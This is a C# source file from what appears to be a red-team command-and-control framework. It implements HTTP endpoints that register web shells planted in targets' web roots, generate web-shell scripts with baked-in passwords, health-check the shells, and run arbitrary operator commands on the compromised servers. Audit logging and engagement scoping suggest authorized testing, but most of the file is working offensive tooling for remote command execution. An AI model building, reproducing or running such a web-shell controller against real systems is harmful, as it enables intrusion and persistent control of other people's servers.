using System.Text;
using System.Diagnostics;
using System.Net.Http.Json;
using System.Security.Claims;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Routing;
using Rod.Audit;
using Rod.CoreState;
using Rod.CoreState.Application;
using Rod.CoreState.Implants;
using Rod.CoreState.Operators;
using Rod.CoreState.Tasks;
using Rod.CoreState.WebShells;
using Rod.Transport.WebShells;

namespace Rod.Transport.Endpoints;

/// <summary>
/// The engagement's web-shell endpoints (architecture.md Sec 5.2's
/// Web-shell class): scripts an operator placed in targets' web roots,
/// registered here against the engagement and driven by their protocol
/// adapter. Registration returns the rendered one-liner to place (or to
/// cross-check against what was placed); the probe is a one-request health
/// check; execution rides the normal task lifecycle driven synchronously
/// by the operator's request -- issue, claim, adapter round trip, result
/// -- the Sec 10.3 synchronous exception: a WebShell-class implant never
/// opens a session, so nothing but this route ever claims its tasks, and
/// the task, audit, and timeline arcs read exactly like a beacon's.
/// </summary>
public static class WebShellEndpoints
{
    // The round trip's budget. A web-shell answers one HTTP request per
    // command; past this the endpoint is effectively dead and the task
    // completes failed rather than parking queued.
    private static readonly TimeSpan RoundTripBudget = TimeSpan.FromSeconds(30);

    public static IEndpointRouteBuilder MapWebShellEndpoints(this IEndpointRouteBuilder endpoints)
    {
        var group = endpoints.MapGroup("/engagements/{engagementId}/webshells").RequireAuthorization();

        group.MapGet("/", ListWebShellsAsync).WithName(nameof(ListWebShellsAsync));
        group.MapPost("/", RegisterWebShellAsync).WithName(nameof(RegisterWebShellAsync));
        group.MapDelete("/{implantId}", RemoveWebShellAsync).WithName(nameof(RemoveWebShellAsync));
        group.MapPost("/{implantId}:test", ProbeWebShellAsync).WithName(nameof(ProbeWebShellAsync));
        group.MapPost("/{implantId}:exec", ExecuteWebShellAsync).WithName(nameof(ExecuteWebShellAsync));
        group.MapPost("/scripts", GenerateScriptAsync).WithName(nameof(GenerateScriptAsync));

        return endpoints;
    }

    private static async Task<IResult> ListWebShellsAsync(
        string engagementId,
        WebShellService service,
        CancellationToken cancellationToken)
    {
        if (!EngagementId.TryParse(engagementId, out var engagement))
            return Results.BadRequest(new Problem("Engagement id is not a valid identifier."));

        var listed = await service.ListAsync(engagement, cancellationToken);
        return Results.Ok(listed.Select(row => WebShellResponse.From(row.Implant, row.Profile)).ToArray());
    }

    private static async Task<IResult> RegisterWebShellAsync(
        string engagementId,
        RegisterWebShellRequest body,
        ClaimsPrincipal user,
        WebShellService service,
        Rod.Audit.IPayloadStore payloads,
        IAuditStore audit,
        TimeProvider clock,
        CancellationToken cancellationToken)
    {
        if (!EngagementId.TryParse(engagementId, out var engagement))
            return Results.BadRequest(new Problem("Engagement id is not a valid identifier."));
        var operatorId = user.TryGetOperatorId();
        if (operatorId is null)
            return Results.Unauthorized();

        var url = body.Url?.Trim();
        if (string.IsNullOrWhiteSpace(url) || !Uri.TryCreate(url, UriKind.Absolute, out var uri)
            || uri.Scheme is not ("http" or "https"))
        {
            return Results.BadRequest(new Problem("The web-shell URL must be an absolute http(s) address."));
        }

        // A generated script may be claimed by its payload id: the family
        // and the credential read back out of the stored script, so the
        // operator never copies a key by hand. The claim must name a
        // WebShell-class payload of this engagement.
        Rod.Audit.PayloadRecord? claimed = null;
        string? claimedScript = null;
        if (body.PayloadId is { } claimedText)
        {
            if (!Guid.TryParse(claimedText.Trim(), out var claimedValue)
                || await payloads.FindAsync(claimedValue, engagement.Value, cancellationToken) is not { } found
                || found.Class != "WebShell")
            {
                return Results.BadRequest(new Problem(
                    "PayloadId does not name one of this engagement's generated web-shell scripts."));
            }
            claimed = found;
            claimedScript = Encoding.UTF8.GetString(found.Content);
        }

        var adapter = WebShellAdapters.Find(
            body.AdapterId?.Trim() ?? claimed?.Target ?? "rod-php");
        if (adapter is null)
            return Results.BadRequest(new Problem(
                "Protocol adapter is not recognized. Use one of: " + string.Join(", ", WebShellAdapters.Names()) + "."));

        // The credential is whatever the family's placed script carries --
        // a connection password for the one-liner family, the baked key for
        // the sealed ones. A claim supplies it from the stored script;
        // otherwise an unsupplied one is generated so a placed script and
        // its profile always agree.
        var password = string.IsNullOrWhiteSpace(body.Password)
            ? claimedScript is { } script ? adapter.ReadCredentialFromScript(script) : adapter.GenerateCredential()
            : body.Password.Trim();
        if (password is null || !adapter.IsValidCredential(password))
            return Results.BadRequest(new Problem(
                $"The {adapter.Id} credential is not usable ({adapter.CredentialHint}); leave it empty or claim the generated payload."));
        var encoder = string.IsNullOrWhiteSpace(body.Encoder) ? adapter.DefaultEncoder : body.Encoder.Trim();
        var decoder = string.IsNullOrWhiteSpace(body.Decoder) ? adapter.DefaultDecoder : body.Decoder.Trim();

        try
        {
            var (implant, profile) = await service.RegisterAsync(
                engagement, url, uri.Host, adapter.Id, password, encoder, decoder,
                operatorId.Value, cancellationToken);

            await audit.AppendAsync(
                AuditEvent.Fact(
                    eventId: Guid.NewGuid(),
                    engagementId: engagement.Value,
                    operatorId: operatorId.Value.Value,
                    implantId: implant.Id.Value,
                    taskId: Guid.Empty,
                    verb: "webshell.registered",
                    kind: AuditEventKind.WebShellRegistered,
                    payload: $"url={url} adapter={adapter.Id}",
                    output: null,
                    outcome: implant.Id.ToString(),
                    at: clock.GetUtcNow()),
                cancellationToken);

            return Results.Created(
                $"/engagements/{engagement}/webshells/{implant.Id}",
                WebShellResponse.From(implant, profile, adapter.RenderScript(password)));
        }
        catch (InvalidOperationException ex)
        {
            return Results.BadRequest(new Problem(ex.Message));
        }
    }

    private static async Task<IResult> RemoveWebShellAsync(
        string engagementId,
        string implantId,
        ClaimsPrincipal user,
        WebShellService service,
        IAuditStore audit,
        TimeProvider clock,
        CancellationToken cancellationToken)
    {
        var (failure, endpoint) = await ResolveScopedWebShellAsync(
            engagementId, implantId, service, cancellationToken);
        if (endpoint is null)
            return failure!;

        var operatorId = user.TryGetOperatorId();
        if (operatorId is null)
            return Results.Unauthorized();

        if (!await service.RemoveAsync(endpoint.Engagement, endpoint.Profile.ImplantId, cancellationToken))
            return Results.NotFound(new Problem("Web-shell endpoint does not exist."));

        await audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: endpoint.Engagement.Value,
                operatorId: operatorId.Value.Value,
                implantId: endpoint.Profile.ImplantId.Value,
                taskId: Guid.Empty,
                verb: "webshell.removed",
                kind: AuditEventKind.WebShellRemoved,
                payload: $"url={endpoint.Profile.Url}",
                output: null,
                outcome: endpoint.Profile.ImplantId.ToString(),
                at: clock.GetUtcNow()),
            cancellationToken);
        return Results.NoContent();
    }

    // The probe: one adapter round trip with a marker echo, answering the
    // roster's health question without tasking. It executes on the target,
    // so it is audited like any other operator action.
    private static async Task<IResult> ProbeWebShellAsync(
        string engagementId,
        string implantId,
        ClaimsPrincipal user,
        WebShellService service,
        IHttpClientFactory http,
        IAuditStore audit,
        TimeProvider clock,
        CancellationToken cancellationToken)
    {
        var (failure, endpoint) = await ResolveScopedWebShellAsync(
            engagementId, implantId, service, cancellationToken);
        if (endpoint is null)
            return failure!;

        var operatorId = user.TryGetOperatorId();
        if (operatorId is null)
            return Results.Unauthorized();

        var marker = WebShellAdapters.RandomToken(8, 12);
        var (ok, latency, detail) = await RoundTripAsync(
            http, endpoint.Profile, $"echo {marker}", cancellationToken);
        var reached = ok && detail?.Contains(marker, StringComparison.Ordinal) == true;
        ok = reached;

        await service.NoteProbeAsync(endpoint.Engagement, endpoint.Profile.ImplantId, ok, cancellationToken);
        await audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: endpoint.Engagement.Value,
                operatorId: operatorId.Value.Value,
                implantId: endpoint.Profile.ImplantId.Value,
                taskId: Guid.Empty,
                verb: "webshell.probed",
                kind: AuditEventKind.WebShellProbed,
                payload: $"ok={ok} latencyMs={latency.TotalMilliseconds:F0}",
                output: null,
                outcome: endpoint.Profile.ImplantId.ToString(),
                at: clock.GetUtcNow()),
            cancellationToken);

        // The refusal reason rides the answer when the probe failed, so the
        // roster can say why an endpoint is dead instead of just that it is.
        return Results.Ok(new
        {
            ok,
            latencyMs = (long)latency.TotalMilliseconds,
            detail = reached ? null : detail,
        });
    }

    // The synchronous execution arc (architecture.md Sec 10.3's exception):
    // the operator's request itself plays the beacon -- issue the task,
    // claim it, run the adapter round trip, record the result. Every arc
    // the beacon path walks (audit on issue, dispatch, completion; the live
    // fan-out) happens here in one request.
    private static async Task<IResult> ExecuteWebShellAsync(
        string engagementId,
        string implantId,
        ExecuteWebShellRequest body,
        ClaimsPrincipal user,
        WebShellService service,
        TaskService tasks,
        IHttpClientFactory http,
        IAuditStore audit,
        TimeProvider clock,
        CancellationToken cancellationToken)
    {
        var (failure, endpoint) = await ResolveScopedWebShellAsync(
            engagementId, implantId, service, cancellationToken);
        if (endpoint is null)
            return failure!;

        var operatorId = user.TryGetOperatorId();
        if (operatorId is null)
            return Results.Unauthorized();
        if (string.IsNullOrWhiteSpace(body.Command))
            return Results.BadRequest(new Problem("Command is required."));

        var implantIdValue = endpoint.Profile.ImplantId;
        TaskIssued issued;
        try
        {
            issued = await tasks.IssueAsync(
                new IssueTaskCommand(
                    endpoint.Engagement,
                    implantIdValue,
                    operatorId.Value,
                    "shell.exec",
                    body.Command),
                onIssued: (taskIssued, ct) => AppendIssuedAuditAsync(taskIssued, audit, ct),
                cancellationToken: cancellationToken);
        }
        catch (TaskRejectedException ex)
        {
            return Results.Json(
                new Problem($"The task was refused: {ex.Message}."),
                statusCode: StatusCodes.Status422UnprocessableEntity);
        }

        // The claim is the same one a beacon's writer makes; for a
        // WebShell-class implant this route is the only claimer there is.
        var dispatched = await tasks.DispatchNextAsync(implantIdValue, cancellationToken);
        if (dispatched is null || dispatched.TaskId != issued.TaskId)
            return Results.Json(
                new Problem("The queued command was claimed by another path; it is not executable here."),
                statusCode: StatusCodes.Status409Conflict);
        await AppendDispatchedAuditAsync(dispatched, audit, cancellationToken);

        var stopwatch = Stopwatch.StartNew();
        var (ok, _, output) = await RoundTripAsync(http, endpoint.Profile, body.Command, cancellationToken);
        stopwatch.Stop();

        TaskCompleted completed;
        if (ok)
        {
            completed = await tasks.RecordResultAsync(
                issued.TaskId, output ?? string.Empty, TaskOutcome.Succeeded, cancellationToken);
        }
        else
        {
            completed = await tasks.RecordResultAsync(
                issued.TaskId,
                output ?? "The web-shell round trip failed.",
                TaskOutcome.Failed,
                cancellationToken);
        }
        await AppendCompletedAuditAsync(completed, audit, cancellationToken);
        await service.NoteProbeAsync(endpoint.Engagement, implantIdValue, ok, cancellationToken);

        return Results.Ok(new ExecuteWebShellResponse(
            issued.TaskId.ToString(),
            completed.Output,
            completed.Outcome.ToString(),
            stopwatch.ElapsedMilliseconds));
    }

    // A short excerpt for the refusal detail: enough to name what the
    // endpoint actually answered, never the whole body.
    private static string Truncate(string text)
        => text.Length <= 160 ? text : text[..160] + "…";

    // Standalone generation (the classic managers' workflow): render a
    // script with its credential baked in, without any endpoint to register.
    // The script lands in the payload store like any build -- fingerprinted,
    // attributed, re-downloadable -- so preparing artifacts ahead of an
    // operation is a first-class flow. The credential (the family's
    // connection password or baked key) is generated when unsupplied; the
    // audit fact names the adapter and never the credential.
    private static async Task<IResult> GenerateScriptAsync(
        string engagementId,
        GenerateWebShellScriptRequest body,
        ClaimsPrincipal user,
        IPayloadStore payloads,
        IAuditStore audit,
        TimeProvider clock,
        CancellationToken cancellationToken)
    {
        if (!EngagementId.TryParse(engagementId, out var engagement))
            return Results.BadRequest(new Problem("Engagement id is not a valid identifier."));
        var operatorId = user.TryGetOperatorId();
        if (operatorId is null)
            return Results.Unauthorized();

        var adapter = WebShellAdapters.Find(body.AdapterId?.Trim() ?? "rod-php");
        if (adapter is null)
            return Results.BadRequest(new Problem(
                "Protocol adapter is not recognized. Use one of: " + string.Join(", ", WebShellAdapters.Names()) + "."));

        var password = string.IsNullOrWhiteSpace(body.Password)
            ? adapter.GenerateCredential()
            : body.Password.Trim();
        if (!adapter.IsValidCredential(password))
            return Results.BadRequest(new Problem(
                $"The {adapter.Id} credential is not usable ({adapter.CredentialHint}); leave it empty to generate one."));
        var script = adapter.RenderScript(password);
        var content = Encoding.UTF8.GetBytes(script);
        var payloadId = Guid.NewGuid();
        var at = clock.GetUtcNow();
        var fingerprint = Rod.BuildPipeline.PayloadBuild.ArtifactFingerprint.Of(content);

        await payloads.SaveAsync(
            new PayloadRecord(
                payloadId,
                engagement.Value,
                "WebShell",
                adapter.ScriptLanguage,
                "text/plain",
                fingerprint,
                content,
                content.Length,
                at,
                Target: adapter.Id),
            cancellationToken);
        await audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: engagement.Value,
                operatorId: operatorId.Value.Value,
                implantId: Guid.Empty,
                taskId: Guid.Empty,
                verb: "payload.build",
                kind: AuditEventKind.PayloadBuilt,
                payload: $"{adapter.ScriptLanguage}:webshell adapter={adapter.Id} password=baked",
                output: null,
                outcome: fingerprint,
                at),
            cancellationToken);

        return Results.Ok(new WebShellScriptResponse(
            payloadId.ToString("N"),
            adapter.Id,
            adapter.ScriptLanguage,
            password,
            script,
            fingerprint));
    }

    // One adapter round trip: encode, POST the form, decode the framed
    // answer. The failure modes collapse to (false, latency, detail) --
    // refused connection, non-2xx answer, or an answer that does not carry
    // the protocol's markers all read the same to the caller.
    private static async Task<(bool Ok, TimeSpan Latency, string? Output)> RoundTripAsync(
        IHttpClientFactory http,
        Rod.CoreState.WebShells.WebShellProfile profile,
        string command,
        CancellationToken cancellationToken)
    {
        var adapter = WebShellAdapters.Find(profile.AdapterId);
        if (adapter is null)
            return (false, TimeSpan.Zero, $"The '{profile.AdapterId}' adapter is no longer registered.");

        WebShellRequest request;
        try
        {
            request = adapter.EncodeCommand(
                profile.Url, profile.Password, profile.Encoder, profile.Decoder, command);
        }
        catch (NotSupportedException ex)
        {
            return (false, TimeSpan.Zero, ex.Message);
        }

        var stopwatch = Stopwatch.StartNew();
        try
        {
            var client = http.CreateClient("webshells");
            client.Timeout = RoundTripBudget;
            using var response = await client.PostAsync(
                request.Url, new FormUrlEncodedContent(request.Form), cancellationToken);
            var body = await response.Content.ReadAsStringAsync(cancellationToken);
            stopwatch.Stop();
            if (!response.IsSuccessStatusCode)
                return (false, stopwatch.Elapsed, $"The endpoint answered {response.StatusCode}.");

            var decoded = adapter.DecodeResponse(request, profile.Decoder, body);
            return decoded is null
                ? (false, stopwatch.Elapsed,
                    $"The endpoint's answer did not carry the protocol's markers: {Truncate(body)}")
                : (true, stopwatch.Elapsed, decoded);
        }
        catch (Exception ex) when (
            ex is HttpRequestException or TaskCanceledException or OperationCanceledException)
        {
            stopwatch.Stop();
            return (false, stopwatch.Elapsed, $"The round trip failed: {ex.Message}");
        }
    }

    // Resolves the scoped endpoint: the engagement in the path must own the
    // WebShell-class row, so a foreign engagement's id is indistinguishable
    // from an unknown one (the same construction every scoped surface
    // follows). Returns the failure result instead of the endpoint when
    // resolution refuses.
    private static async Task<(IResult? Failure, ScopedWebShell? Endpoint)> ResolveScopedWebShellAsync(
        string engagementId,
        string implantId,
        WebShellService service,
        CancellationToken cancellationToken)
    {
        if (!EngagementId.TryParse(engagementId, out var engagement))
            return (Results.BadRequest(new Problem("Engagement id is not a valid identifier.")), null);

        if (!ImplantId.TryParse(implantId, out var implant))
            return (Results.BadRequest(new Problem("Web-shell id is not a valid identifier.")), null);

        var resolved = await service.FindAsync(engagement, implant, cancellationToken);
        if (resolved is null)
            return (Results.NotFound(new Problem("Web-shell endpoint does not exist.")), null);

        return (null, new ScopedWebShell(engagement, resolved.Value.Implant, resolved.Value.Profile));
    }

    private sealed record ScopedWebShell(
        EngagementId Engagement,
        Implant Implant,
        WebShellProfile Profile);

    private static async System.Threading.Tasks.Task AppendIssuedAuditAsync(
        TaskIssued issued, IAuditStore audit, CancellationToken cancellationToken)
        => await audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: issued.EngagementId.Value,
                operatorId: issued.IssuedBy.Value,
                implantId: issued.ImplantId.Value,
                taskId: issued.TaskId.Value,
                verb: issued.Verb,
                kind: AuditEventKind.TaskIssued,
                payload: issued.Arguments,
                output: null,
                outcome: issued.TaskId.ToString(),
                at: issued.CreatedAt),
            cancellationToken);

    private static System.Threading.Tasks.Task AppendDispatchedAuditAsync(
        TaskDispatched dispatched, IAuditStore audit, CancellationToken cancellationToken)
        => audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: dispatched.EngagementId.Value,
                operatorId: dispatched.IssuedBy.Value,
                implantId: dispatched.ImplantId.Value,
                taskId: dispatched.TaskId.Value,
                verb: dispatched.Verb,
                kind: AuditEventKind.TaskDispatched,
                payload: dispatched.Arguments,
                output: null,
                outcome: dispatched.TaskId.ToString(),
                at: dispatched.DispatchedAt),
            cancellationToken);

    private static System.Threading.Tasks.Task AppendCompletedAuditAsync(
        TaskCompleted completed, IAuditStore audit, CancellationToken cancellationToken)
        => audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: completed.EngagementId.Value,
                operatorId: completed.IssuedBy.Value,
                implantId: completed.ImplantId.Value,
                taskId: completed.TaskId.Value,
                verb: completed.Verb,
                kind: AuditEventKind.TaskCompleted,
                payload: completed.Arguments,
                output: completed.Output,
                outcome: completed.Outcome.ToString(),
                at: completed.CompletedAt),
            cancellationToken);

    private sealed record WebShellResponse(
        string ImplantId,
        string Url,
        string AdapterId,
        string Password,
        string Encoder,
        string Decoder,
        string ScriptLanguage,
        bool Retired,
        DateTimeOffset RegisteredAt,
        DateTimeOffset? LastProbeAt,
        bool? LastProbeOk,
        string? Script = null)
    {
        public static WebShellResponse From(
            Rod.CoreState.Implants.Implant implant,
            Rod.CoreState.WebShells.WebShellProfile profile,
            string? script = null)
            => new(
                implant.Id.ToString(),
                profile.Url,
                profile.AdapterId,
                profile.Password,
                profile.Encoder,
                profile.Decoder,
                profile.AdapterId.Split('-').LastOrDefault() ?? "",
                implant.IsRetired,
                profile.RegisteredAt,
                profile.LastProbeAt,
                profile.LastProbeOk,
                script);
    }
}

/// <summary>
/// Registers a web-shell endpoint; the script renders from the resolved
/// adapter, or the credential is claimed from a generated payload.
/// </summary>
public sealed record RegisterWebShellRequest(
    string Url,
    string? AdapterId = null,
    string? Password = null,
    string? Encoder = null,
    string? Decoder = null,
    string? PayloadId = null);

/// <summary>One command for a web-shell endpoint to run synchronously.</summary>
public sealed record ExecuteWebShellRequest(string Command);

/// <summary>
/// Generates a web-shell script with its credential baked in, decoupled from
/// any endpoint: prepare the artifact first, place it, register the reachable
/// URL whenever it exists.
/// </summary>
public sealed record GenerateWebShellScriptRequest(string? AdapterId = null, string? Password = null);

/// <summary>
/// The generated script: where it is stored (the payload id and fingerprint)
/// and the connection password it was baked with.
/// </summary>
public sealed record WebShellScriptResponse(
    string PayloadId,
    string AdapterId,
    string ScriptLanguage,
    string Password,
    string Script,
    string Fingerprint);

/// <summary>The synchronous execution's answer: the task id and its completed outcome.</summary>
public sealed record ExecuteWebShellResponse(string TaskId, string Output, string Outcome, long ElapsedMs);
